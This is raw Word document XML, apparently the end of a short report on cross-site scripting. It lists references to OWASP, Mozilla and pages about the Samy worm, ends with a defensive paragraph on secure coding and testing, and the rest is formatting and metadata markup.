          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2144F93E" w14:textId="77777777" w:rsidR="009530E1" w:rsidRDefault="00A66412" w:rsidP="009530E1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">OWASP XSS Cheat Sheet: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EBCE1AF" w14:textId="4CD60E75" w:rsidR="009530E1" w:rsidRDefault="00236F89" w:rsidP="009530E1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId6" w:history="1">
        <w:r w:rsidR="009530E1" w:rsidRPr="00DF2394">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1D21BF16" w14:textId="77777777" w:rsidR="009530E1" w:rsidRPr="009530E1" w:rsidRDefault="009530E1" w:rsidP="009530E1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64E1F91F" w14:textId="1974BE80" w:rsidR="009530E1" w:rsidRPr="009530E1" w:rsidRDefault="009530E1" w:rsidP="009530E1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009530E1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Samy Kamkar’s website:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="707230A9" w14:textId="7AC2FCE6" w:rsidR="009530E1" w:rsidRDefault="009530E1" w:rsidP="009530E1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:hyperlink r:id="rId7" w:history="1">
        <w:r w:rsidRPr="00DF2394">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>https://samy.pl/myspace/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="256D0974" w14:textId="77777777" w:rsidR="009530E1" w:rsidRDefault="009530E1" w:rsidP="009530E1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="366D8720" w14:textId="3BC2E510" w:rsidR="009530E1" w:rsidRPr="009530E1" w:rsidRDefault="00A66412" w:rsidP="009530E1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009530E1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Wikipedia: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EC0F8E8" w14:textId="68334357" w:rsidR="007F392E" w:rsidRPr="009530E1" w:rsidRDefault="009530E1" w:rsidP="009530E1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:hyperlink r:id="rId8" w:history="1">
        <w:r w:rsidRPr="00DF2394">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>https://en.wikipedia.org/wiki/Samy_(computer_worm)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="244D8307" w14:textId="77777777" w:rsidR="009530E1" w:rsidRPr="009530E1" w:rsidRDefault="009530E1" w:rsidP="009530E1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="083ECDDD" w14:textId="1B5F2915" w:rsidR="009530E1" w:rsidRPr="009530E1" w:rsidRDefault="009530E1" w:rsidP="009530E1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009530E1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Mozilla Developer XSS Guide: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1588AC" w14:textId="103260A8" w:rsidR="009530E1" w:rsidRPr="009530E1" w:rsidRDefault="009530E1" w:rsidP="009530E1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:hyperlink r:id="rId9" w:history="1">
        <w:r w:rsidRPr="00DF2394">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>https://developer.mozilla.org/en-US/docs/Web/Security/XSS</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="11ED0779" w14:textId="77777777" w:rsidR="009530E1" w:rsidRPr="009530E1" w:rsidRDefault="009530E1" w:rsidP="009530E1">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FFCB1EB" w14:textId="53B9D253" w:rsidR="00A66412" w:rsidRDefault="00A66412" w:rsidP="00A66412">
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Cross-Site Scripting (XSS) continues to be a major concern for modern web applications. Despite advancements in web security technologies, the fundamental issues leading to XSS remain due to poor input validation and improper output encoding. Developers must be aware of the potential damage these vulnerabilities can cause and should actively test their applications for XSS vectors using tools like OWASP ZAP and Burp Suite.</w:t>
      </w:r>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Educating users and developers alike is key. Organizations should enforce secure coding practices, regular security audits, and conduct awareness training to ensure the risk of XSS is minimized. </w:t>
      </w:r>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C424D48" w14:textId="328A9C43" w:rsidR="006C6472" w:rsidRDefault="006C6472">
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:sectPr w:rsidR="006C64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7E45EF"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="ACF010CE"/>
    <w:lvl w:ilvl="0" w:tplc="06E4CC5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A57336"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="498E5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D9718A"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="1E0AD0B6"/>
    <w:lvl w:ilvl="0" w:tplc="06E4CC56">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2C1465"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="678AA9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D07B11"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="29CE1F42"/>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14" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="371A3218"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9D289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B16051F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="700296AC"/>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6" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="4C1E5D4F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9D289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4"/>
  </w:num>
  <w:num w:numId="12">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="9"/>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36F89"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="006C6472"/>
    <w:rsid w:val="007F392E"/>
    <w:rsid w:val="009530E1"/>
    <w:rsid w:val="009A739E"/>
    <w:rsid w:val="00A66412"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00B51BFC"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00E65022"/>
    <w:rsid w:val="00EE27D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836AA953-473E-4D27-B3B0-65AD46D0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39E"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading1Char"/>
    <w:uiPriority w:val="9"/>
    <w:qFormat/>
    <w:rsid w:val="009A739E"/>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9A739E"/>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9A739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A739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A739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A739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A739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A739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A739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9A739E"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading1Char">
    <w:name w:val="Heading 1 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading1"/>
    <w:uiPriority w:val="9"/>
    <w:rsid w:val="009A739E"/>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9A739E"/>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9A739E"/>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9A739E"/>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9A739E"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
      <w:spacing w:val="-7"/>
      <w:sz w:val="80"/>
      <w:szCs w:val="80"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Subtitle">
    <w:name w:val="Subtitle"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="SubtitleChar"/>
    <w:uiPriority w:val="11"/>
    <w:qFormat/>
    <w:rsid w:val="009A739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A739E"/>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ind w:left="360"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListContinue2">
    <w:name w:val="List Continue 2"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="0029639D"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListContinue3">
    <w:name w:val="List Continue 3"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="0029639D"/>
    <w:pPr>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9A739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A739E"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Heading4Char">
    <w:name w:val="Heading 4 Char"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:link w:val="Heading4"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="009A739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A739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A739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A739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A739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A739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A739E"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Strong">
    <w:name w:val="Strong"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="22"/>
    <w:qFormat/>
    <w:rsid w:val="009A739E"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Emphasis">
    <w:name w:val="Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="20"/>
    <w:qFormat/>
    <w:rsid w:val="009A739E"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="IntenseQuote">
    <w:name w:val="Intense Quote"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="IntenseQuoteChar"/>
    <w:uiPriority w:val="30"/>
    <w:qFormat/>
    <w:rsid w:val="009A739E"/>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9A739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9A739E"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="IntenseEmphasis">
    <w:name w:val="Intense Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="21"/>
    <w:qFormat/>
    <w:rsid w:val="009A739E"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="SubtleReference">
    <w:name w:val="Subtle Reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="31"/>
    <w:qFormat/>
    <w:rsid w:val="009A739E"/>
    <w:rPr>
      <w:smallCaps/>
      <w:color w:val="404040" w:themeColor="text1" w:themeTint="BF"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="IntenseReference">
    <w:name w:val="Intense Reference"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="32"/>
    <w:qFormat/>
    <w:rsid w:val="009A739E"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="BookTitle">
    <w:name w:val="Book Title"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="33"/>
    <w:qFormat/>
    <w:rsid w:val="009A739E"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="TOCHeading">
    <w:name w:val="TOC Heading"/>
    <w:basedOn w:val="Heading1"/>
    <w:next w:val="Normal"/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="009A739E"/>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F392E"/>
    <w:rPr>
      <w:color w:val="0000FF" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="UnresolvedMention">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="007F3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amy_(computer_worm)" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://samy.pl/myspa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heatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Shee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Security/X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6E7B0-1313-4F92-AB6A-F4EF4E6C3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5</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-07-11T12:30:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-07-11T12:43:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>